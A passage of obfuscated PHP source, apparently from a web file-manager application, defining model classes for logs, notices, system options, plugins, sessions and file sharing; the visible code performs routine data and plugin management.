$ªî®Î©¶ = IO::infoFull($øªÏ£Ìµ[$ÅÄ£ì•ñ[84]]); } catch (Exception $¡¥¸¾–Ë) { continue; } $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[402]] = $ªî®Î©¶[$ÅÄ£ì•ñ[402]]; $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[2088]] = $ªî®Î©¶[$ÅÄ£ì•ñ[432]]; $á¨’İ¢[$´æÍö ³][$ÅÄ£ì•ñ[453]] = json_encode($øªÏ£Ìµ); continue; } $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[402]]; $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[2088]]; if ($øªÏ£Ìµ[$ÅÄ£ì•ñ[33]] == $ÅÄ£ì•ñ[557]) { $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[453]][$ÅÄ£ì•ñ[1174]]; $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[453]][$ÅÄ£ì•ñ[1175]]; } if ($øªÏ£Ìµ[$ÅÄ£ì•ñ[33]] == $ÅÄ£ì•ñ[2098]) { $Øå¹¦Õ”[] = $øªÏ£Ìµ[$ÅÄ£ì•ñ[453]][$ÅÄ£ì•ñ[402]]; } } if (!$Øå¹¦Õ”) { return array(); } return Model($ÅÄ£ì•ñ[831])->sourceListInfo($Øå¹¦Õ”, !0); } private function logList($­Åôäé‘) { $ı®ûâô° =& $_SERVER[Ã¶¡¶„æ]; $®±æƒÎä = array_to_keyvalue($­Åôäé‘, $ı®ûâô°[12], $ı®ûâô°[1676]); $˜ÛŸ¯ö¢ = Model($ı®ûâô°[535])->userListInfo(array_unique($®±æƒÎä)); $ïäŒóÇ¯ = $this->getSourceList($­Åôäé‘); $°Š÷”Íò = $this->typeAll(); $ï«¡«ŒÏ = array(); $àæ…¿Á‘ = array(); foreach ($­Åôäé‘ as $‡Ò÷“Ÿ– => $Í©…êÚÊ) { $¡¿ëÒ„ = $Í©…êÚÊ[$ı®ûâô°[33]]; $úŞÌôê = isset($˜ÛŸ¯ö¢[$Í©…êÚÊ[$ı®ûâô°[1676]]]) ? $˜ÛŸ¯ö¢[$Í©…êÚÊ[$ı®ûâô°[1676]]] : !1; $úÈÕçñû = strpos($¡¿ëÒ„, $ı®ûâô°[2287]) === 0 ? LNG($ı®ûâô°[2288]) : LNG($ı®ûâô°[2283]); $Í©…êÚÊ[$ı®ûâô°[32]] = isset($úŞÌôê[$ı®ûâô°[32]]) ? $úŞÌôê[$ı®ûâô°[32]] : LNG($ı®ûâô°[2283]); $Í©…êÚÊ[$ı®ûâô°[542]] = isset($úŞÌôê[$ı®ûâô°[542]]) ? $úŞÌôê[$ı®ûâô°[542]] : $ı®ûâô°[12]; $Í©…êÚÊ[$ı®ûâô°[1576]] = isset($°Š÷”Íò[$¡¿ëÒ„]) ? $°Š÷”Íò[$¡¿ëÒ„] : $úÈÕçñû; $Í©…êÚÊ[$ı®ûâô°[2033]] = $úŞÌôê; $†©ë´íî = json_decode($Í©…êÚÊ[$ı®ûâô°[453]], !0); $Í©…êÚÊ[$ı®ûâô°[2280]] = isset($†©ë´íî[$ı®ûâô°[2280]]) ? $†©ë´íî[$ı®ûâô°[2280]] : $ı®ûâô°[12]; $Í©…êÚÊ[$ı®ûâô°[2284]] = IpLocation::get($Í©…êÚÊ[$ı®ûâô°[2280]]); if (strpos($¡¿ëÒ„, $ı®ûâô°[2090]) === 0 || isset($†©ë´íî[$ı®ûâô°[2088]])) { $†©ë´íî[$ı®ûâô°[86]] = $ïäŒóÇ¯[$†©ë´íî[$ı®ûâô°[402]]]; $†©ë´íî[$ı®ûâô°[2103]] = $ïäŒóÇ¯[$†©ë´íî[$ı®ûâô°[2088]]]; if ($†©ë´íî[$ı®ûâô°[33]] == $ı®ûâô°[557]) { $†©ë´íî[$ı®ûâô°[453]][$ı®ûâô°[1174]] = $ïäŒóÇ¯[$†©ë´íî[$ı®ûâô°[453]][$ı®ûâô°[1174]]]; $†©ë´íî[$ı®ûâô°[453]][$ı®ûâô°[1175]] = $ïäŒóÇ¯[$†©ë´íî[$ı®ûâô°[453]][$ı®ûâô°[1175]]]; } if ($†©ë´íî[$ı®ûâô°[33]] == $ı®ûâô°[2098]) { $†©ë´íî[$ı®ûâô°[453]][$ı®ûâô°[402]] = $ïäŒóÇ¯[$†©ë´íî[$ı®ûâô°[453]][$ı®ûâô°[402]]]; } if ($†©ë´íî[$ı®ûâô°[33]] == $ı®ûâô°[1834]) { $†©ë´íî[$ı®ûâô°[2103]] = $†©ë´íî[$ı®ûâô°[86]]; $†©ë´íî[$ı®ûâô°[2088]] = $†©ë´íî[$ı®ûâô°[2103]][$ı®ûâô°[402]]; $†©ë´íî[$ı®ûâô°[86]] = !1; $†©ë´íî[$ı®ûâô°[402]] = $ı®ûâô°[12]; } if ($†©ë´íî[$ı®ûâô°[86]] && $†©ë´íî[$ı®ûâô°[86]][$ı®ûâô°[411]] == $ı®ûâô°[1299]) { $àæ…¿Á‘[] = $Í©…êÚÊ[$ı®ûâô°[399]]; unset($­Åôäé‘[$‡Ò÷“Ÿ–]); continue; } if ($†©ë´íî[$ı®ûâô°[2103]] && $†©ë´íî[$ı®ûâô°[2103]][$ı®ûâô°[411]] == $ı®ûâô°[1299]) { $àæ…¿Á‘[] = $Í©…êÚÊ[$ı®ûâô°[399]]; unset($­Åôäé‘[$‡Ò÷“Ÿ–]); continue; } } $Í©…êÚÊ[$ı®ûâô°[453]] = $†©ë´íî; unset($Í©…êÚÊ[$ı®ûâô°[2289]]); $ï«¡«ŒÏ[] = $Í©…êÚÊ; } $this->clearSystemPathLog($àæ…¿Á‘); return $ï«¡«ŒÏ; } private function clearSystemPathLog($ú°™ıË¬) { $¿á—Ï€š =& $_SERVER[Ã¶¡¶„æ]; if (count($ú°™ıË¬) == 0) { return; } $Õö‰ïÔ€ = array($¿á—Ï€š[399] => array($¿á—Ï€š[7], array_unique($ú°™ıË¬))); $this->where($Õö‰ïÔ€)->delete(); } public function deviceList($¼öĞ¤„, $•­ŠÃ‘Ñ = 0) { $»Æô¾Æ× =& $_SERVER[Ã¶¡¶„æ]; $›ËÜÛ÷Õ = array($»Æô¾Æ×[1676] => $¼öĞ¤„, $»Æô¾Æ×[200] => array($»Æô¾Æ×[1028], $•­ŠÃ‘Ñ), $»Æô¾Æ×[33] => $»Æô¾Æ×[1808]); $Ûìİï‘¼ = array(); $¾ê—öªğ = $this->field($»Æô¾Æ×[2290])->where($›ËÜÛ÷Õ)->order($»Æô¾Æ×[2101])->limit(50)->select(); foreach ($¾ê—öªğ as $é’éöÂ† => $ôªÎÈ§¼) { if ($é’éöÂ† > 0 && abs($ôªÎÈ§¼[$»Æô¾Æ×[200]] - $¾ê—öªğ[$é’éöÂ† - 1][$»Æô¾Æ×[200]]) < 5) { continue; } $Ôã™Ù… = json_decode($ôªÎÈ§¼[$»Æô¾Æ×[453]], !0); $ôªÎÈ§¼[$»Æô¾Æ×[2280]] = isset($Ôã™Ù…[$»Æô¾Æ×[2280]]) ? $Ôã™Ù…[$»Æô¾Æ×[2280]] : $»Æô¾Æ×[12]; unset($Ôã™Ù…[$»Æô¾Æ×[2280]]); $ú·’ÒÜ¨ = $this->deviceType($Ôã™Ù…[$»Æô¾Æ×[2091]]); if (isset($Ûìİï‘¼[$ú·’ÒÜ¨])) { continue; } $ôªÎÈ§¼[$»Æô¾Æ×[2284]] = IpLocation::get($ôªÎÈ§¼[$»Æô¾Æ×[2280]]); $ôªÎÈ§¼[$»Æô¾Æ×[453]] = $Ôã™Ù…; $Ûìİï‘¼[$ú·’ÒÜ¨] = $ôªÎÈ§¼; } return array_values($Ûìİï‘¼); } public function deviceType($ç¶±ğ¦¦) { return $ç¶±ğ¦¦; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\156\x6f\x74\151\143\145\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\x63\157\x6e\164\x65\156\x74", "\141\x75\x74\x68", "\x6d\x6f\144\x65", "\164\151\x6d\145", "\x74\x79\x70\145", "\x6c\x65\166\x65\x6c", "\145\156\141\x62\154\145", "\x73\x6f\x72\x74"); public function listData($¶ôøí°æ = false, $ãÖ›ú×£ = "\163\x6f\162\x74", $Êù‘¢Ö† = false) { return parent::listData($¶ôøí°æ, $ãÖ›ú×£, $Êù‘¢Ö†); } public function add($§Ê¹É¤) { $“÷™ı =& $_SERVER[Ã¶¡¶„æ]; $ùù™à÷‹ = time(); if ($§Ê¹É¤[$“÷™ı[16]] == $“÷™ı[2291]) { $ùù™à÷‹ = strtotime($§Ê¹É¤[$“÷™ı[203]]); } $§Ê¹É¤[$“÷™ı[203]] = $ùù™à÷‹; return parent::insert($§Ê¹É¤); } public function update($®Ÿ‰Ã×·, $ë’çÜè) { $ŠåŞËÂ =& $_SERVER[Ã¶¡¶„æ]; $Êğ·ã¼¿ = $this->listData($®Ÿ‰Ã×·); if (!$Êğ·ã¼¿) { return !1; } $ÙÍ­æ¸· = time(); if ($ë’çÜè[$ŠåŞËÂ[16]] == $ŠåŞËÂ[2291]) { $ÙÍ­æ¸· = strtotime($ë’çÜè[$ŠåŞËÂ[203]]); } $ë’çÜè[$ŠåŞËÂ[203]] = $ÙÍ­æ¸·; return parent::update($®Ÿ‰Ã×·, $ë’çÜè); } public function remove($ÄÀÙ‘Ó) { $½ˆ™ºâ­ = $this->listData($ÄÀÙ‘Ó); if (!$½ˆ™ºâ­ || $½ˆ™ºâ­[$_SERVER[Ã¶¡¶„æ][1299]]) { return !1; } return parent::remove($ÄÀÙ‘Ó); } public function sort($•ÍÔ·ºÄ, $ğ¹ÈİÈ¼) { return parent::update($•ÍÔ·ºÄ, $ğ¹ÈİÈ¼); } public function enable($ª‡Õ·, $áâø“ÃÄ) { return parent::update($ª‡Õ·, array($_SERVER[Ã¶¡¶„æ][2292] => $áâø“ÃÄ)); } private function initUserOption() { $øìÙÀ =& $_SERVER[Ã¶¡¶„æ]; $this->optionType = $øìÙÀ[2293]; $this->modelType = $øìÙÀ[2294]; $this->field = array($øìÙÀ[2295], $øìÙÀ[32], $øìÙÀ[203], $øìÙÀ[33], $øìÙÀ[2296], $øìÙÀ[756], $øìÙÀ[195]); } public function userNoticeGet($°Û¶†â = false) { $this->initUserOption(); return parent::listData($°Û¶†â, $_SERVER[Ã¶¡¶„æ][399], !0); } public function userNoticeAdd($™ğÉ³€¸) { $Î—ëİÑ =& $_SERVER[Ã¶¡¶„æ]; $this->initUserOption(); $Â‡¼Ê¦ï = $this->findByKey($Î—ëİÑ[2295], $™ğÉ³€¸[$Î—ëİÑ[399]]); if ($Â‡¼Ê¦ï) { return !0; } $ÛÏ¸¼Ó = array($Î—ëİÑ[2295] => $™ğÉ³€¸[$Î—ëİÑ[399]], $Î—ëİÑ[32] => $™ğÉ³€¸[$Î—ëİÑ[32]], $Î—ëİÑ[203] => $™ğÉ³€¸[$Î—ëİÑ[203]], $Î—ëİÑ[33] => isset($™ğÉ³€¸[$Î—ëİÑ[33]]) ? $™ğÉ³€¸[$Î—ëİÑ[33]] : 1, $Î—ëİÑ[2296] => isset($™ğÉ³€¸[$Î—ëİÑ[2296]]) ? $™ğÉ³€¸[$Î—ëİÑ[2296]] : 0, $Î—ëİÑ[756] => 0, $Î—ëİÑ[195] => 0); return parent::insert($ÛÏ¸¼Ó); } public function userNoticeEdit($œ©ğ¦îÚ, $­¬½Ù›í) { $this->initUserOption(); return parent::update($œ©ğ¦îÚ, $­¬½Ù›í); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\157\x70\164\x69\x6f\156"; protected $jsonField = array("\155\x65\156\x75", "\x72\157\x6c\x65", "\162\x6f\154\145\x47\x72\157\x75\x70", "\162\145\147\x69\163\x74", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($öàŠˆ¾¹) { return "\x53\171\163\164\145\x6d\x4f\160\164\151\157\x6e\x5f{$öàŠˆ¾¹}"; } protected function optionDefault($É¢æ‹ÎÍ = '') { $üüñÑïŒ =& $_SERVER[Ã¶¡¶„æ]; if ($É¢æ‹ÎÍ == $üüñÑïŒ[12]) { return $GLOBALS[$üüñÑïŒ[6]][$üüñÑïŒ[381]]; } } } goto cë§çÌ×µ; AÌÑÙª¨“ë: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x70\x6c\x75\147\x69\x6e\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\163\164\141\164\x75\x73", "\162\x65\147\x69\145\x73\x74", "\x63\157\156\x66\x69\147"); public function loadList($Ø„Ó¯© = false) { $ˆİÓ‚æö = array_to_keyvalue($this->listData(), $_SERVER[Ã¶¡¶„æ][32]); if ($Ø„Ó¯©) { return $ˆİÓ‚æö[$Ø„Ó¯©]; } return $ˆİÓ‚æö; } public function init() { $ûèè²Ğ¥ =& $_SERVER[Ã¶¡¶„æ]; Hook::trigger($ûèè²Ğ¥[1985]); $£óÕŸé = $this->loadPluginList(); foreach ($£óÕŸé as $ĞºèŠñ• => $¸–ïØˆ) { $üèÍ× = $this->appAllow($ĞºèŠñ•, $¸–ïØˆ); if (!$üèÍ×) { continue; } foreach ($¸–ïØˆ[$ûèè²Ğ¥[1986]] as $ÏöÜß€ => $Ô“‰´öê) { Hook::bind($ÏöÜß€, $Ô“‰´öê); } } Hook::trigger($ûèè²Ğ¥[1987]); Hook::trigger(ACTION); } public function appAllow($™‰Š¾Œ¥, $ûí¡³âÂ, $—ª˜— = true) { $„ñ£©¬Í =& $_SERVER[Ã¶¡¶„æ]; $³œÏ¦…ø = PLUGIN_DIR . $™‰Š¾Œ¥ . $„ñ£©¬Í[1988]; if (!is_array($ûí¡³âÂ) || !is_array($ûí¡³âÂ[$„ñ£©¬Í[1986]]) || $ûí¡³âÂ[$„ñ£©¬Í[756]] != 1 || !is_file($³œÏ¦…ø)) { return !1; } if ($GLOBALS[$„ñ£©¬Í[503]] == 1) { if ($GLOBALS[$„ñ£©¬Í[6]][$„ñ£©¬Í[1989]] || !$GLOBALS[$„ñ£©¬Í[6]][$„ñ£©¬Í[1990]]) { return !0; } $µ¨¸†¤£ = explode($„ñ£©¬Í[50], strtolower($GLOBALS[$„ñ£©¬Í[6]][$„ñ£©¬Í[1990]])); return in_array(strtolower($™‰Š¾Œ¥), $µ¨¸†¤£) ? !1 : !0; } if ($—ª˜— && !Action($„ñ£©¬Í[1991])->checkAuth($™‰Š¾Œ¥)) { return !1; } return !0; } public function unInstall($ÃÍÆŠáã) { $Ã‚Ç‡á™ =& $_SERVER[Ã¶¡¶„æ]; $‰ÇŠçôÁ = $this->loadList($ÃÍÆŠáã); if (file_exists(PLUGIN_DIR . $ÃÍÆŠáã)) { Hook::apply($ÃÍÆŠáã . $Ã‚Ç‡á™[1992]); } $this->remove($‰ÇŠçôÁ[$Ã‚Ç‡á™[399]]); } public function changeStatus($¢•Ì¢’€, $­ şõõ¿) { $Š×ÒŞ¦Ì =& $_SERVER[Ã¶¡¶„æ]; $„µÁ—Úò = $this->loadList($¢•Ì¢’€); if ($­ şõõ¿) { Hook::apply($¢•Ì¢’€ . $Š×ÒŞ¦Ì[1993]); } $this->update($„µÁ—Úò[$Š×ÒŞ¦Ì[399]], array($Š×ÒŞ¦Ì[1994] => $­ şõõ¿)); } public function appRegist($÷ÓÊÕö£, $Âô¥û–´) { $¹óéâ²  =& $_SERVER[Ã¶¡¶„æ]; $¨Ûˆøü÷ = $this->loadList($÷ÓÊÕö£); if ($¨Ûˆøü÷) { $this->update($¨Ûˆøü÷[$¹óéâ² [399]], array($¹óéâ² [1986] => $Âô¥û–´)); } else { $ˆ¡ïŸìı = array($¹óéâ² [32] => $÷ÓÊÕö£, $¹óéâ² [1986] => $Âô¥û–´, $¹óéâ² [756] => 0, $¹óéâ² [6] => $this->getConfigDefault($÷ÓÊÕö£)); $this->insert($ˆ¡ïŸìı); } } public function getConfigDefault($Ğ­¸ÁÆ“) { $¨ç»¯úö =& $_SERVER[Ã¶¡¶„æ]; $ÁˆËÈ°† = array(); $ôÈé—–‡ = $this->getPackageJson($Ğ­¸ÁÆ“); if (!$ôÈé—–‡ && is_array($ôÈé—–‡[$¨ç»¯úö[1995]])) { return $ÁˆËÈ°†; } foreach ($ôÈé—–‡[$¨ç»¯úö[1995]] as $€‹š©Ó¯ => $¦ÊÁ×) { if (!isset($¦ÊÁ×[$¨ç»¯úö[374]]) || isset($ÁˆËÈ°†[$€‹š©Ó¯])) { continue; } $ÁˆËÈ°†[$€‹š©Ó¯] = $¦ÊÁ×[$¨ç»¯úö[374]]; } return $ÁˆËÈ°†; } public function getPackageJson($Øä’ıÙò) { return Hook::apply($Øä’ıÙò . $_SERVER[Ã¶¡¶„æ][1996]); } public function getConfig($¸‘üÔÛ¸, $ñü·£ıÚ = false) { $˜¸—Ö°Ï =& $_SERVER[Ã¶¡¶„æ]; $ÀçÙê¼„ = array(); $¢Ô¸àÒÆ = $this->loadList($¸‘üÔÛ¸); if ($¢Ô¸àÒÆ && is_array($¢Ô¸àÒÆ[$˜¸—Ö°Ï[6]])) { $ÀçÙê¼„ = $¢Ô¸àÒÆ[$˜¸—Ö°Ï[6]]; } if (!$ÀçÙê¼„ || $ñü·£ıÚ) { $ÀçÙê¼„ = $this->getConfigDefault($¸‘üÔÛ¸); } return $ÀçÙê¼„; } public function setConfig($¬Şğ”‚, $ÖµÓî” = false) { $Ü¿ŠîûË =& $_SERVER[Ã¶¡¶„æ]; $‹ÜÌ›ıİ = $this->loadList($¬Şğ”‚); if (!$‹ÜÌ›ıİ) { return !1; } $·Úâ×— = $‹ÜÌ›ıİ[$Ü¿ŠîûË[6]]; if ($ÖµÓî” == !1) { $·Úâ×— = array(); $ÖµÓî” = $this->getConfigDefault($¬Şğ”‚); } foreach ($ÖµÓî” as $ú÷‹ÖÄº => $Î²ñÍó) { $·Úâ×—[$ú÷‹ÖÄº] = is_string($Î²ñÍó) ? trim($Î²ñÍó) : $Î²ñÍó; } $this->update($‹ÜÌ›ıİ[$Ü¿ŠîûË[399]], array($Ü¿ŠîûË[6] => $·Úâ×—)); } public function viewList() { $¥ËÍùÅŞ =& $_SERVER[Ã¶¡¶„æ]; $µ¢Æâ¢ = $this->loadList(); $this->pluginScan($µ¢Æâ¢); $µ¢Æâ¢ = $this->loadPluginList(); $›¹÷Á½ú = array(); foreach ($µ¢Æâ¢ as $¼ä”ÇÚ› => $ÏÌÜ‚À§) { unset($ÏÌÜ‚À§[$¥ËÍùÅŞ[1986]], $ÏÌÜ‚À§[$¥ËÍùÅŞ[6]]); $ÀÊõÉ–Ú = PLUGIN_DIR . $ÏÌÜ‚À§[$¥ËÍùÅŞ[32]] . $¥ËÍùÅŞ[1988]; if (!is_file($ÀÊõÉ–Ú)) { continue; } $€¼ºØÑ = Hook::apply($ÏÌÜ‚À§[$¥ËÍùÅŞ[32]] . $¥ËÍùÅŞ[1996]); if (is_array($€¼ºØÑ)) { $›¹÷Á½ú[$¼ä”ÇÚ›] = array_merge($ÏÌÜ‚À§, $€¼ºØÑ); } } return $›¹÷Á½ú; } private function loadPluginList() { $ÚË‡åŸä =& $_SERVER[Ã¶¡¶„æ]; $ßü¸È™¿ = $this->loadList(); if (strtolower(MOD) == $ÚË‡åŸä[1997]) { return $ßü¸È™¿; } $á¹»ñÓ÷ = Hook::trigger($ÚË‡åŸä[1998], $ßü¸È™¿); if ($ßü¸È™¿ && !$á¹»ñÓ÷) { die; } return $á¹»ñÓ÷ ? $á¹»ñÓ÷ : $ßü¸È™¿; } private function pluginScan($Ê”©„ó) { $œÃì¯íç =& $_SERVER[Ã¶¡¶„æ]; recursion_dir(PLUGIN_DIR, $ôš½˜£Î, $ÛÇÑ¹åƒ, 0); foreach ($ôš½˜£Î as $Çê¼¨¸¨) { $ÑãÏÕ‚´ = get_path_this($Çê¼¨¸¨); if (isset($Ê”©„ó[$ÑãÏÕ‚´]) || !file_exists($Çê¼¨¸¨ . $œÃì¯íç[1999]) || !file_exists($Çê¼¨¸¨ . $œÃì¯íç[1988])) { continue; } Hook::apply($ÑãÏÕ‚´ . $œÃì¯íç[1993]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\x73\x65\163\163\x69\157\156"; public function get($ãşòÙâ±) { $¿Ø‚äºº =& $_SERVER[Ã¶¡¶„æ]; $å¥·ÓÁù = $this->where(array($¿Ø‚äºº[2000] => $ãşòÙâ±))->find(); if (!is_array($å¥·ÓÁù)) { return !1; } return $å¥·ÓÁù[$¿Ø‚äºº[761]]; } public function set($Åù¾ıšÛ, $Éä¼Íç², $×¢İâïÆ = 3600) { $ªŸ‘¸¹ =& $_SERVER[Ã¶¡¶„æ]; $¢ñ·äğš = array($ªŸ‘¸¹[2000] => $Åù¾ıšÛ, $ªŸ‘¸¹[1904] => $Éä¼Íç², $ªŸ‘¸¹[2001] => $×¢İâïÆ + time()); if (Session::get($ªŸ‘¸¹[2002])) { $¢ñ·äğš[$ªŸ‘¸¹[1676]] = Session::get($ªŸ‘¸¹[2002]); } else { $¢ñ·äğš[$ªŸ‘¸¹[1676]] = 0; } if ($this->get($Åù¾ıšÛ)) { return $this->where(array($ªŸ‘¸¹[2000] => $Åù¾ıšÛ))->save($¢ñ·äğš); } else { return $this->add($¢ñ·äğš, array(), !0); } } public function remove($óñÏĞÜê) { return $this->where(array($_SERVER[Ã¶¡¶„æ][2000] => $óñÏĞÜê))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ã¶¡¶„æ][2003] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\x69\155\x65", "\x74\x69\155\145", "\x69\156\163\145\x72\164\54\165\x70\144\141\x74\x65", "\146\165\156\x63\x74\151\157\x6e"), array("\143\162\145\141\164\145\x54\151\155\x65", "\164\151\155\145", "\x69\156\163\145\162\164", "\146\x75\x6e\143\164\151\157\x6e"), array("\x6f\160\164\x69\x6f\156\163", '', "\x69\156\163\x65\162\x74\x2c\x75\x70\x64\x61\x74\145\54\x73\145\x6c\145\143\164", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ï¡«îÛö) { $Ï¾§ºúë =& $_SERVER[Ã¶¡¶„æ]; $Ùï•„Éï = isset($ï¡«îÛö[0]) ? $ï¡«îÛö[0] : !1; return array($Ï¾§ºúë[2004] => array(USER_ID, $Ï¾§ºúë[2005]), $Ï¾§ºúë[1945] => array($Ùï•„Éï, $Ï¾§ºúë[2006])); } protected function listSimple() { $—Ûâæšœ = array($_SERVER[Ã¶¡¶„æ][1676] => USER_ID); $Şú³ûà = $this->field($this->fieldList)->where($—Ûâæšœ)->select(); return $Şú³ûà ? $Şú³ûà : array(); } protected function getInfo($Ö›Ë¨æë, $»êÆÒúú = false) { $ú¾‚çÓœ =& $_SERVER[Ã¶¡¶„æ]; if ($»êÆÒúú) { return $this->_getShareInfo(array($ú¾‚çÓœ[489] => $Ö›Ë¨æë)); } $ÍÂ‚óÆ‡ = $this->cacheFunctionGet($ú¾‚çÓœ[1947], $Ö›Ë¨æë); return $ÍÂ‚óÆ‡; } public function getInfoByHash($é¸ˆ×¯) { return $this->_getShareInfo(array($_SERVER[Ã¶¡¶„æ][491] => $é¸ˆ×¯)); } public function getInfoByPath($Ê˜ª½¿Ñ) { $¡­ÀÇ³Ğ =& $_SERVER[Ã¶¡¶„æ]; $Îíªî² = array($¡­ÀÇ³Ğ[1676] => USER_ID, $¡­ÀÇ³Ğ[402] => $Ê˜ª½¿Ñ); return $this->_getShareInfo($Îíªî²); } public function getInfoBySourcePath($ÚßÆ¤Ø°) { $Ş‘¿Á‹ƒ =& $_SERVER[Ã¶¡¶„æ]; $û¡†ª˜ò = array($Ş‘¿Á‹ƒ[1676] => USER_ID, $Ş‘¿Á‹ƒ[1190] => $ÚßÆ¤Ø°); return $this->_getShareInfo($û¡†ª˜ò); } private function _getShareInfo($Š×ÔŞ¾–) { $æ‚™¿ãå =& $_SERVER[Ã¶¡¶„æ]; $üÖçúıı = $this->where($Š×ÔŞ¾–)->find(); if (!$üÖçúıı) { return !1; } $Š×ÔŞ¾– = array($æ‚™¿ãå[489] => $üÖçúıı[$æ‚™¿ãå[489]]); $Ôú»³… = $æ‚™¿ãå[2007]; $çóŸ“ğù = Model($æ‚™¿ãå[602])->order($æ‚™¿ãå[399])->field($Ôú»³…)->where($Š×ÔŞ¾–)->select(); if ($üÖçúıı[$æ‚™¿ãå[402]] == $æ‚™¿ãå[197]) { $üÖçúıı[$æ‚™¿ãå[86]] = IO::info($üÖçúıı[$æ‚™¿ãå[1190]]); } else { $üÖçúıı[$æ‚™¿ãå[86]] = Model($æ‚™¿ãå[1350])->pathInfo($üÖçúıı[$æ‚™¿ãå[402]]); } $üÖçúıı[$æ‚™¿ãå[2008]] = $çóŸ“ğù; return $üÖçúıı; } protected function getInfoAuth($…¼ÌáÕ©) { $Œ«øŠé“ =& $_SERVER[Ã¶¡¶„æ]; $Ô•¿Åâá = $this->getInfo($…¼ÌáÕ©); if ($Ô•¿Åâá[$Œ«øŠé“[1676]] == USER_ID) { $Ô•¿Åâá[$Œ«øŠé“[413]] = $Ô•¿Åâá[$Œ«øŠé“[86]][$Œ«øŠé“[413]]; } else { $Ô•¿Åâá[$Œ«øŠé“[413]] = Model($Œ«øŠé“[502])->authMake($Ô•¿Åâá[$Œ«øŠé“[2008]]); } return $Ô•¿Åâá; } protected function listData($Š±Õâ = null, $±èéò‚ = 300) { $Ó­ñ²” =& $_SERVER[Ã¶¡¶„æ]; $ã†‡ùî£ = array(array($Ó­ñ²”[494] => array($Ó­ñ²”[1026], 0), $Ó­ñ²”[496] => array($Ó­ñ²”[1026], 0), $Ó­ñ²”[2009] => $Ó­ñ²”[1963])); if ($Š±Õâ == $Ó­ñ²”[2010]) { $ã†‡ùî£ = array($Ó­ñ²”[494] => 1); } else { if ($Š±Õâ == $Ó­ñ²”[1175]) { $ã†‡ùî£ = array($Ó­ñ²”[496] => 1); } } $ã†‡ùî£[$Ó­ñ²”[1676]] = USER_ID; $¨ı¡Ë¡ = $this->where($ã†‡ùî£)->selectPage($±èéò‚); return $¨ı¡Ë¡; } protected function listToMe($¿²ŞÄı¹ = 300) { $¹àßı» =& $_SERVER[Ã¶¡¶„æ]; $ş¸°‰ïå = Model($¹àßı»[2011])->userGroupParents(USER_ID); $‚—æÅ±ı = array($¹àßı»[586] => SourceModel::TYPE_USER, $¹àßı»[505] => USER_ID); if ($ş¸°‰ïå) { $‚—æÅ±ı = array(array($¹àßı»[586] => SourceModel::TYPE_USER, $¹àßı»[505] => USER_ID), array($¹àßı»[586] => SourceModel::TYPE_GROUP, $¹àßı»[505] => array($¹àßı»[7], $ş¸°‰ïå)), $¹àßı»[2009] => $¹àßı»[1963]); } $à¦µÑ§Ë = Model($¹àßı»[602])->where($‚—æÅ±ı)->selectPage($¿²ŞÄı¹); $¯™½ù§Œ = array_to_keyvalue_group($à¦µÑ§Ë[$¹àßı»[369]], $¹àßı»[489]); if (!$¯™½ù§Œ) { return $à¦µÑ§Ë; } $Ê¹ÃÇ«æ = $¹àßı»[2012]; $‚—æÅ±ı = array($¹àßı»[489] => array($¹àßı»[418], array_keys($¯™½ù§Œ)), $¹àßı»[1676] => array($¹àßı»[1028], $¹àßı»[197])); $Ï„Çí¯İ = $this->field($Ê¹ÃÇ«æ)->where($‚—æÅ±ı)->select(); foreach ($Ï„Çí¯İ as $ãº Ú¶Ô => &$ÛÑÒõıä) { $ÛÑÒõıä[$¹àßı»[2008]] = $¯™½ù§Œ[$ÛÑÒõıä[$¹àßı»[489]]]; } unset($ÛÑÒõıä); $ò¬™Á¡ë = array($¹àßı»[2013] => $Ï„Çí¯İ, $¹àßı»[2014] => $à¦µÑ§Ë[$¹àßı»[366]]); return $ò¬™Á¡ë; } protected function shareAdd($†õ¼óğ÷, $ışÏùîü) { $£ïœî­ø =& $_SERVER[Ã¶¡¶„æ]; $²÷µ×·Ü = $this->_addShareData($†õ¼óğ÷, $ışÏùîü); if (!empty($ışÏùîü[$£ïœî­ø[2015]])) { $this->_shareAuthSet($²÷µ×·Ü, $ışÏùîü[$£ïœî­ø[2015]]); } $this->shareEventAdd($†õ¼óğ÷, $ışÏùîü, $£ïœî­ø[1178]); return $²÷µ×·Ü; } protected function shareAddSystem($¸õôŞ¬õ, $Ì›’œâ°) { $İ£úëÒ± =& $_SERVER[Ã¶¡¶„æ]; $×Ş¢˜¯æ = $this->_addShareData($¸õôŞ¬õ, $Ì›’œâ°, $İ£úëÒ±[1299]); $this->_shareAuthSet($×Ş¢˜¯æ, $Ì›’œâ°[$İ£úëÒ±[2015]]); return $×Ş¢˜¯æ; } private function shareEventAdd($Æò‰ùœ, $˜”¯Ëµœ, $Ëíäö€ß = "\141\144\144") { $ÚªßÙËß =& $_SERVER[Ã¶¡¶„æ]; if (!$Æò‰ùœ || $Æò‰ùœ == $ÚªßÙËß[197]) { return; } if ($Ëíäö€ß == $ÚªßÙËß[1178]) { if ($˜”¯Ëµœ[$ÚªßÙËß[494]] == $ÚªßÙËß[88]) { Model($ÚªßÙËß[570])->eventShare($Æò‰ùœ, $ÚªßÙËß[2016]); } if ($˜”¯Ëµœ[$ÚªßÙËß[496]] == $ÚªßÙËß[88]) { Model($ÚªßÙËß[570])->eventShare($Æò‰ùœ, $ÚªßÙËß[2017]); } return; } $»ÈÛÉšÄ = 